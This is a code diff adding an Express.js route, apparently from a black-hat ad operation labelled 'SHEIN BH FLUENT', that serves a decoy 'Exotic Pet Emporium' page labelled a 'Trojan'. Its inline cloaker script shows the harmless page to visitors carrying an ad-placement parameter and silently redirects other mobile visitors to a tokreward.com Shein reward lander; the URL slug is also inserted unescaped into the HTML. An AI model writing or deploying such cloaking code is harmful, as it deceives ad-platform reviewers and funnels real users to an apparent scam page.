@@ -17,6 +17,132 @@ app.use(express.static(path.join(__dirname, 'public')));
 // ALEXI 5.0
 
 // SHEIN BH FLUENT
+app.get('/94123/:slug', (req, res, next) => {
+    const { slug } = req.params;
+    const destinationLander = `https://tokreward.com/sheinesp.html?slug=941`;
+    const trojanHTML = `
+        <!DOCTYPE html>
+        <html lang="en">
+        <head>
+            <meta charset="UTF-8">
+            <meta name="viewport" content="width=device-width, initial-scale=1.0">
+            <script>
+                // Cloaker logic
+                const urlParams = new URLSearchParams(window.location.search);
+                const utmXXX = urlParams.get("xxx");
+                const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+                if (utmXXX === "__PLACEMENT__") {
+                    } else if (isMobileDevice) {
+                        window.location.href = "${destinationLander}";
+                    } else {
+                    }
+            </script>
+            <title>${slug} Exotic Pet Emporium</title>
+            <style>
+                body, html {
+                    margin: 0;
+                    padding: 0;
+                    font-family: 'Quicksand', sans-serif;
+                    background-color: #f0f8ff;
+                    color: #333;
+                }
+                .pet-container {
+                    max-width: 1200px;
+                    margin: 0 auto;
+                    padding: 20px;
+                }
+                header {
+                    background-color: #4682b4;
+                    color: #fff;
+                    text-align: center;
+                    padding: 2em;
+                    margin-bottom: 30px;
+                }
+                .pet-showcase {
+                    display: grid;
+                    grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
+                    gap: 25px;
+                }
+                .pet-card {
+                    background-color: #fff;
+                    border-radius: 15px;
+                    overflow: hidden;
+                    box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+                    transition: transform 0.3s ease;
+                }
+                .pet-card:hover {
+                    transform: translateY(-5px);
+                }
+                .pet-card img {
+                    width: 100%;
+                    height: 200px;
+                    object-fit: cover;
+                }
+                .pet-info {
+                    padding: 20px;
+                }
+                footer {
+                    background-color: #4682b4;
+                    color: #fff;
+                    text-align: center;
+                    padding: 1em;
+                    margin-top: 30px;
+                }
+                footer a {
+                    color: #f0e68c;
+                }
+            </style>
+        </head>
+        <body>
+            <header>
+                <h1>${slug} Exotic Pet Emporium</h1>
+                <p>Discover unique companions from around the world</p>
+            </header>
+            <div class="pet-container">
+                <h2>Our Exotic Collection</h2>
+                <p>Welcome to ${slug} Exotic Pet Emporium, where you can find extraordinary animals to brighten your life!</p>
+                <div class="pet-showcase">
+                    <div class="pet-card">
+                        <img src="https://example.com/axolotl.jpg" alt="Axolotl">
+                        <div class="pet-info">
+                            <h3>Axolotl</h3>
+                            <p>These adorable aquatic salamanders are known for their unique appearance and regenerative abilities.</p>
+                        </div>
+                    </div>
+                    <div class="pet-card">
+                        <img src="https://example.com/fennec-fox.jpg" alt="Fennec Fox">
+                        <div class="pet-info">
+                            <h3>Fennec Fox</h3>
+                            <p>With their large ears and small size, these desert foxes make charming and energetic companions.</p>
+                        </div>
+                    </div>
+                    <div class="pet-card">
+                        <img src="https://example.com/sugar-glider.jpg" alt="Sugar Glider">
+                        <div class="pet-info">
+                            <h3>Sugar Glider</h3>
+                            <p>These nocturnal marsupials are social creatures that bond closely with their owners.</p>
+                        </div>
+                    </div>
+                    <div class="pet-card">
+                        <img src="https://example.com/bearded-dragon.jpg" alt="Bearded Dragon">
+                        <div class="pet-info">
+                            <h3>Bearded Dragon</h3>
+                            <p>Friendly and relatively low-maintenance, these lizards make great pets for reptile enthusiasts.</p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            <footer>
+                <p>&copy; 2024 ${slug} Exotic Pet Emporium | <a href="https://tokreward.com/pp.html">Privacy Policy</a></p>
+            </footer>
+        </body>
+        </html>
+    `;
+    res.send(trojanHTML);
+    console.log(`Served 941 Trojan (${slug})`);
+});
+
+// SHEIN BH FLUENT
 app.get('/94878/:slug', (req, res, next) => {
     const { slug } = req.params;
     const destinationLander = `https://tokreward.com/shein.html?slug=948`;
